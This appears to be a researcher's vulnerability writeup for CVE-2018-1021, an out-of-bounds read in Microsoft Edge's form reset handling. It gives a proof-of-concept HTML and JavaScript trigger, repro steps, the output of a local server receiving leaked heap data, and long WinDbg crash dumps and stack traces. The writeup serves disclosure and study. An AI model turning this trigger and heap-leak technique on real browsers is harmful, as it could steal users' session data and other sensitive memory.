# CVE-2018-1021 | ZDI-18-428 - MicrosoftEdge Information Disclosure Vulnerability
<html><a href="https://www.zerodayinitiative.com/advisories/ZDI-18-428/">zdi ADVISORY</a></html>

```c

vulnerability details =================================================================================================:

msedge edgehtml!CFormElement::DoReset OOB read information disclosure vulnerability,
there exist an information disclosure vulnerability in microsoftedge as of the time of writing (19/2/2018).
this vulnerability is reliably exploitable and high in severity.

users of the browser may be affected to data theft as an attacker can disclose data out of the process heap.
to be clear this is not only exploitable for further compromise of the renderer process but also
exploitable of its own as an attacker can disclose sensitive information stored in the browser, like session storage etc..

technical details =================================================================================================:

lets look at some of the poc:

[cut]
<script>
function probForUaf() {

	var d = JunkJunk.defaultValue;
	JunkJunk.addEventListener("DOMNodeRemoved",doReset,false);
	doReset();
}

function doReset() {

	Reset.reset();
	var dd = JunkJunk.defaultValue;
	
}
</script>
</head>
<body onload=probForUaf()>
<col id="Junk">
<form id="Reset">
<output id="JunkJunk">
<time id="whatsTheTime?">
[cut]

when we reset "reset" elem this in turn calls 

00007ffd638bb76e edgehtml!OutputElement::DoReset+0x000000000000003e
00007ffd638c0bbf edgehtml!CFormElement::DoReset+0x0000000000000137
00007ffd634517f2 edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x0000000000000072

that end up calling:

edgehtml!Tree::TextData::Create+0x5c
edgehtml!Tree::TreeWriter::NewTextNode+0x3d
edgehtml!Tree::ElementNode::SetTextContent+0x74
edgehtml!OutputElement::DoReset+0x3e

the problem is that CFormElement::DoReset free's invokes the proxy we set up in probforuaf
and calls 
edgehtml!Tree::TreeWriter::RemoveNode+0x126
edgehtml!Tree::ElementNode::SetTextContent+0x1f
edgehtml!OutputElement::DoReset+0x3e
edgehtml!CFormElement::DoReset+0x137

but then later compute's this node value based on free memory.
this disclose memory from the process heap.
see the debugging info below.

note that defaultValue is the field that gets created and data is copied to.
we can retrieve this data by reading this value.

given a poc that constantly reads memory from the process and sends this data back to a simple python server.
this can be done over the web.

repro:

to crash the browser:
	(1) enable page heap: gflags -i microsoftedge.exe +hpa +ust
			      gflags -i microsoftedgecp.exe +hpa +ust
	(2) attach a debugger and load poc.html
	
	you should see the crash immediately.

to repro the info disclosure:
	disable page heap (we dont want to crash the browser).

place the python script anywhere.

run the server: python s.py
	allow the server to pass the firewall.

on the browser side you will see alerts.
press ok a few times and then mark the dont allow this page to alert anymore and
let it run for a few times, then close the browser (becouse of cpu usage, so youll be able to see what information is being disclosed).

you should see something like this:

stealing heap data on localhost:50007
Connected by ('127.0.0.1', 57592)
POST / HTTP/1.1
Accept: */*
Origin: file://
Referer: file:///C:/Users/akayn/Desktop/poc.html
Accept-Language: en-US,en;q=0.7,he;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
content-type: text/plain;charset=UTF-8
Accept-Encoding: gzip, deflate
Host: 127.0.0.1:50007
Content-Length: 1008804 <<<--- this is a lot of information disclosure ...
Connection: Keep-Alive
Cache-Control: no-cache

τÇ▒εêÇΦé╕δúóπå░pδúóεèÇδé╕τÇ▒µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pτæ¿τü┤µáÇτæ┤pα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿èα¿

further manipulation and exploitation is possible.

best regards, akayn.

here is the debugging information (with +hpa +ust):

0:019> r
rax=000001474c7dbfe0 rbx=000000000000000a rcx=000001474c7dbff2
rdx=ffffffffb9c1d00c rsi=00000147063f8ff4 rdi=000000000000000a
rip=00007ffd86fd3080 rsp=000000029d8263b8 rbp=0000014f68405a00
 r8=000000000000000a  r9=0000000000000001 r10=000001474c7dbfe0
r11=000001474c7dbfe8 r12=00007ffd6309fd30 r13=0000014728474890
r14=0000000000000000 r15=00007ffd63030790
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
msvcrt!memcpy+0x1c0:
00007ffd`86fd3080 488b440af8      mov     rax,qword ptr [rdx+rcx-8] ds:00000147`063f8ff6=????????????????
0:019> .lastevent
Last event: 1d20.1140: Access violation - code c0000005 (first chance)
  debugger time: Sun Feb 18 16:11:07.860 2018 (UTC - 8:00)
0:019> db rcx
00000147`4c7dbff2  d0 d0 d0 d0 d0 d0 d0 d0-d0 d0 d0 d0 d0 d0 ?? ??  ..............??
00000147`4c7dc002  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000147`4c7dc012  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000147`4c7dc022  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000147`4c7dc032  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000147`4c7dc042  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000147`4c7dc052  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
00000147`4c7dc062  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
0:019> lmvm edgehtml
Browse full module list
start             end                 module name
00007ffd`62b00000 00007ffd`64334000   edgehtml   (pdb symbols)          C:\ProgramData\dbg\sym\edgehtml.pdb\914A9DE941E27CA1CCDF6C7539EC895D1\edgehtml.pdb
    Loaded symbol image file: C:\WINDOWS\SYSTEM32\edgehtml.dll
    Image path: C:\WINDOWS\SYSTEM32\edgehtml.dll
    Image name: edgehtml.dll
    Browse all global symbols  functions  data
    Image was built with /Brepro flag.
    Timestamp:        FE5590D0 (This is a reproducible build file hash, not a timestamp)
    CheckSum:         018206E8
    ImageSize:        01834000
    File version:     11.0.16299.248
    Product version:  11.0.16299.248
    File flags:       0 (Mask 3F)
    File OS:          40004 NT Win32
    File type:        2.0 Dll
    File date:        00000000.00000000
    Translations:     0409.04b0
    CompanyName:      Microsoft Corporation
    ProductName:      Microsoft Edge Web Platform
    InternalName:     EDGEHTML
    OriginalFilename: EDGEHTML.DLL
    ProductVersion:   11.00.16299.248
    FileVersion:      11.00.16299.248 (WinBuild.160101.0800)
    FileDescription:  Microsoft Edge Web Platform
    LegalCopyright:   © Microsoft Corporation. All rights reserved.
0:019> kvnf
 #   Memory  Child-SP          RetAddr           : Args to Child                                                           : Call Site
00           00000002`9d8263b8 00007ffd`86fbb940 : 00000000`00000005 00007ffd`62fff066 00000000`00000012 00000000`00000012 : msvcrt!memcpy+0x1c0
01         8 00000002`9d8263c0 00007ffd`62e4b5bc : 00000002`9d826490 00000147`4c7dbfe0 00007ffd`62445595 00000000`00000000 : msvcrt!memcpy_s+0x60
02        40 00000002`9d826400 00007ffd`62f0d87d : 00000000`00000000 0000014f`4ed6b410 00007368`ae9287af 00007ffd`62ca5f2a : edgehtml!Tree::TextData::Create+0x5c
03        30 00000002`9d826430 00007ffd`62c34c68 : 00000000`00000000 0000014f`4ed6b410 00000002`9d8265a9 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::NewTextNode+0x3d
04        60 00000002`9d826490 00007ffd`638bb76e : 00000000`00000001 00000002`9d8265a9 00000000`00000000 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x74
05        50 00000002`9d8264e0 00007ffd`638c0bbf : 00000002`9d826558 0000014f`4ed6b410 00000000`00000000 00000002`9d826540 : edgehtml!OutputElement::DoReset+0x3e
06        40 00000002`9d826520 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
07        f0 00000002`9d826610 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d8266a0 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
08        60 00000002`9d826670 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d826780 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
09        30 00000002`9d8266a0 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d826690 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
0a        d0 00000002`9d826770 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d61180 : 0x0000014f`68725919
0b        80 00000002`9d8267f0 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
0c        50 00000002`9d826840 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d8268e0 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
0d        60 00000002`9d8268a0 00007ffd`62586872 : 00000147`26da3b40 00000002`9d8269e8 00000147`28474890 00000002`9d826e00 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
0e        f0 00000002`9d826990 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d826a50 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
0f        80 00000002`9d826a10 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d826aa0 00000000`00000000 00000002`9d826ab0 : chakra!ScriptSite::CallRootFunction+0x6d
10        60 00000002`9d826a70 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d826b40 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
11        90 00000002`9d826b00 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d826cc8 : chakra!ScriptEngineBase::Execute+0xb6
12        a0 00000002`9d826ba0 00007ffd`62e40a08 : 0000000d`3fadb60c 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
13        50 00000002`9d826bf0 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d826d01 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
14        40 00000002`9d826c30 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc8c0 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
15       120 00000002`9d826d50 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc8c0 0000014f`613867d0 00000002`9d827020 : edgehtml!CListenerDispatch::Invoke+0xbd
16        90 00000002`9d826de0 00007ffd`62d28d07 : 00000147`082fc8c0 0000014f`4ed6b410 00000002`9d827020 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
17       160 00000002`9d826f40 00007ffd`62e7707f : 00000147`082fc8c0 00000002`9d827020 00000147`082fc8c0 00000002`9d827080 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
18        40 00000002`9d826f80 00007ffd`62c2df50 : 00000147`082fc8c0 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
19       310 00000002`9d827290 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
1a        50 00000002`9d8272e0 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
1b       170 00000002`9d827450 00007ffd`62f8e126 : 00000000`00000101 00000002`9d827539 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
1c        30 00000002`9d827480 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d827600 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
1d       120 00000002`9d8275a0 00007ffd`638bb76e : 00000000`00000001 00000002`9d8276b9 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
1e        50 00000002`9d8275f0 00007ffd`638c0bbf : 00000002`9d827668 0000014f`4ed6b410 00000000`00000000 00000002`9d827650 : edgehtml!OutputElement::DoReset+0x3e
1f        40 00000002`9d827630 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
20        f0 00000002`9d827720 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d8277b0 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
21        60 00000002`9d827780 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d827890 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
22        30 00000002`9d8277b0 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d8277a0 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
23        d0 00000002`9d827880 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d61100 : 0x0000014f`68725919
24        80 00000002`9d827900 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
25        50 00000002`9d827950 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d8279f0 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
26        60 00000002`9d8279b0 00007ffd`62586872 : 00000147`26da3b40 00000002`9d827af8 00000147`28474890 00000002`9d827f00 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
27        f0 00000002`9d827aa0 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d827b60 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
28        80 00000002`9d827b20 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d827bb0 00000000`00000000 00000002`9d827bc0 : chakra!ScriptSite::CallRootFunction+0x6d
29        60 00000002`9d827b80 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d827c50 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
2a        90 00000002`9d827c10 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d827dd8 : chakra!ScriptEngineBase::Execute+0xb6
2b        a0 00000002`9d827cb0 00007ffd`62e40a08 : 0000000d`3fadb4fa 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
2c        50 00000002`9d827d00 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d827e11 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
2d        40 00000002`9d827d40 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc7e0 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
2e       120 00000002`9d827e60 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc7e0 0000014f`613867d0 00000002`9d828130 : edgehtml!CListenerDispatch::Invoke+0xbd
2f        90 00000002`9d827ef0 00007ffd`62d28d07 : 00000147`082fc7e0 0000014f`4ed6b410 00000002`9d828130 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
30       160 00000002`9d828050 00007ffd`62e7707f : 00000147`082fc7e0 00000002`9d828130 00000147`082fc7e0 00000002`9d828190 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
31        40 00000002`9d828090 00007ffd`62c2df50 : 00000147`082fc7e0 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
32       310 00000002`9d8283a0 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
33        50 00000002`9d8283f0 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
34       170 00000002`9d828560 00007ffd`62f8e126 : 00000000`00000101 00000002`9d828649 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
35        30 00000002`9d828590 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d828710 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
36       120 00000002`9d8286b0 00007ffd`638bb76e : 00000000`00000001 00000002`9d8287c9 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
37        50 00000002`9d828700 00007ffd`638c0bbf : 00000002`9d828778 0000014f`4ed6b410 00000000`00000000 00000002`9d828760 : edgehtml!OutputElement::DoReset+0x3e
38        40 00000002`9d828740 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
39        f0 00000002`9d828830 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d8288c0 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
3a        60 00000002`9d828890 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d8289a0 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
3b        30 00000002`9d8288c0 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d8288b0 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
3c        d0 00000002`9d828990 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d61080 : 0x0000014f`68725919
3d        80 00000002`9d828a10 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
3e        50 00000002`9d828a60 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d828b00 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
3f        60 00000002`9d828ac0 00007ffd`62586872 : 00000147`26da3b40 00000002`9d828c08 00000147`28474890 00000002`9d829000 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
40        f0 00000002`9d828bb0 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d828c70 00000147`28474890 00007ffd`62c34c00 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
41        80 00000002`9d828c30 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d828cc0 00000000`00000000 00000002`9d828cd0 : chakra!ScriptSite::CallRootFunction+0x6d
42        60 00000002`9d828c90 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d828d60 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
43        90 00000002`9d828d20 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d828ee8 : chakra!ScriptEngineBase::Execute+0xb6
44        a0 00000002`9d828dc0 00007ffd`62e40a08 : 0000000d`3fadb3b5 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
45        50 00000002`9d828e10 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d828f21 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
46        40 00000002`9d828e50 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc700 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
47       120 00000002`9d828f70 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc700 0000014f`613867d0 00000002`9d829240 : edgehtml!CListenerDispatch::Invoke+0xbd
48        90 00000002`9d829000 00007ffd`62d28d07 : 00000147`082fc700 0000014f`4ed6b410 00000002`9d829240 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
49       160 00000002`9d829160 00007ffd`62e7707f : 00000147`082fc700 00000002`9d829240 00000147`082fc700 00000002`9d8292a0 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
4a        40 00000002`9d8291a0 00007ffd`62c2df50 : 00000147`082fc700 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
4b       310 00000002`9d8294b0 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
4c        50 00000002`9d829500 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
4d       170 00000002`9d829670 00007ffd`62f8e126 : 00000000`00000101 00000002`9d829759 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
4e        30 00000002`9d8296a0 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d829820 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
4f       120 00000002`9d8297c0 00007ffd`638bb76e : 00000000`00000001 00000002`9d8298d9 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
50        50 00000002`9d829810 00007ffd`638c0bbf : 00000002`9d829888 0000014f`4ed6b410 00000000`00000000 00000002`9d829870 : edgehtml!OutputElement::DoReset+0x3e
51        40 00000002`9d829850 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
52        f0 00000002`9d829940 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d8299d0 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
53        60 00000002`9d8299a0 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d829ab0 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
54        30 00000002`9d8299d0 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d8299c0 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
55        d0 00000002`9d829aa0 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d61000 : 0x0000014f`68725919
56        80 00000002`9d829b20 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
57        50 00000002`9d829b70 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d829c10 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
58        60 00000002`9d829bd0 00007ffd`62586872 : 00000147`26da3b40 00000002`9d829d18 00000147`28474890 00000002`9d82a100 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x105
59        f0 00000002`9d829cc0 00007ffd`625867b5 : 00000147`26da3b40 00000002`9d829d80 00000147`28474890 00007ffd`8916d600 : chakra!Js::JavascriptFunction::CallRootFunction+0x7e
5a        80 00000002`9d829d40 00007ffd`62443d1b : 00000147`26da3b40 00000002`9d829dd0 00000000`00000000 00000002`9d829de0 : chakra!ScriptSite::CallRootFunction+0x6d
5b        60 00000002`9d829da0 00007ffd`62446d66 : 00000147`28472f00 00000147`26da3b40 00000002`9d829e70 00000000`00000000 : chakra!ScriptSite::Execute+0x12b
5c        90 00000002`9d829e30 00007ffd`62e40ae1 : 00000147`2846ec10 00000147`26da3b40 00000147`00000002 00000002`9d829ff8 : chakra!ScriptEngineBase::Execute+0xb6
5d        a0 00000002`9d829ed0 00007ffd`62e40a08 : 0000000d`3fadb29e 00000000`000000d2 4588e251`00000000 49cd8a74`6d9d37ae : edgehtml!CJScript9Holder::ExecuteCallbackDirect+0x3d
5e        50 00000002`9d829f20 00007ffd`62ee00a8 : 0000014f`683eccb0 00000002`9d82a031 0000014f`613867d8 0000014f`680e5100 : edgehtml!CJScript9Holder::ExecuteCallback+0x50
5f        40 00000002`9d829f60 00007ffd`62edfdd5 : 0000014f`613867d8 00000147`26da3b40 00000147`082fc620 0000014f`613867d0 : edgehtml!CListenerDispatch::InvokeVar+0x258
60       120 00000002`9d82a080 00007ffd`62edfa07 : 0000014f`613867d8 00000147`082fc620 0000014f`613867d0 00000002`9d82a350 : edgehtml!CListenerDispatch::Invoke+0xbd
61        90 00000002`9d82a110 00007ffd`62d28d07 : 00000147`082fc620 0000014f`4ed6b410 00000002`9d82a350 00007ffd`63030700 : edgehtml!CEventMgr::_InvokeListeners+0x307
62       160 00000002`9d82a270 00007ffd`62e7707f : 00000147`082fc620 00000002`9d82a350 00000147`082fc620 00000002`9d82a3b0 : edgehtml!CEventMgr::_DispatchBubblePhase+0x4f
63        40 00000002`9d82a2b0 00007ffd`62c2df50 : 00000147`082fc620 0000014f`4ed9d5f0 00000000`00000000 00000000`ffffffff : edgehtml!CEventMgr::Dispatch+0x5ef
64       310 00000002`9d82a5c0 00007ffd`62d0ce3b : 00007ffd`63b8c1c0 0000014f`4ed9d5f0 0000014f`68405a00 0000014f`4ed6b410 : edgehtml!CEventMgr::DispatchDOMMutationEvent+0x8c
65        50 00000002`9d82a610 00007ffd`62ee76a5 : 00000147`00000eb3 0000014f`4ed6b410 0000014f`4ed9d5f0 0000014f`68106600 : edgehtml!Tree::TreeWriter::Notify_DOMNodeRemoved_BeforeRemoveNode+0x1a3
66       170 00000002`9d82a780 00007ffd`62f8e126 : 00000000`00000101 00000002`9d82a869 0000014f`68106600 0000014f`68405a00 : edgehtml!Tree::TreeWriter::Notify_BeforeRemoveNode_Unsafe+0x65
67        30 00000002`9d82a7b0 00007ffd`62c34c13 : 0000014f`67f6b6c0 00000002`9d82a930 0000014f`4ed6b520 0000014f`4ed6b410 : edgehtml!Tree::TreeWriter::RemoveNode+0x126
68       120 00000002`9d82a8d0 00007ffd`638bb76e : 00000000`00000001 00000002`9d82a9e9 00000147`2846ec10 00007ffd`62e442c6 : edgehtml!Tree::ElementNode::SetTextContent+0x1f
69        50 00000002`9d82a920 00007ffd`638c0bbf : 00000002`9d82a998 0000014f`4ed6b410 00000000`00000000 00000002`9d82a980 : edgehtml!OutputElement::DoReset+0x3e
6a        40 00000002`9d82a960 00007ffd`634517f2 : 00000000`10000001 00000000`10000001 00000147`2846ec10 0000014f`68725919 : edgehtml!CFormElement::DoReset+0x137
6b        f0 00000002`9d82aa50 00007ffd`6309fd55 : 00000147`4de8e760 0000014f`67f87950 00000002`9d82aae0 0000014f`4ed6b520 : edgehtml!CFastDOM::CHTMLFormElement::Trampoline_reset+0x72
6c        60 00000002`9d82aab0 00007ffd`6256c191 : 0000014f`67f87950 00000000`10000001 00000002`9d82abc0 00000147`083bbb80 : edgehtml!CFastDOM::CHTMLFormElement::Profiler_reset+0x25
6d        30 00000002`9d82aae0 0000014f`68725919 : 0000014f`67f87950 00000000`10000001 00000147`083abd80 00000002`9d82aad0 : chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x1d1
6e        d0 00000002`9d82abb0 00007ffd`625a8bc6 : 00000147`26da3b40 00000000`00000002 00000147`083abea0 00000147`26d60f80 : 0x0000014f`68725919
6f        80 00000002`9d82ac30 00007ffd`62484c7c : 00000147`4de8e760 00000000`00000010 00000000`00000000 ffffffff`fffffffe : chakra!amd64_CallFunction+0x86
70        50 00000002`9d82ac80 00007ffd`62586999 : 00000147`26da3b40 0000014f`786003c0 00000002`9d82ad20 00000147`28474890 : chakra!Js::JavascriptFunction::CallFunction<1>+0x9c
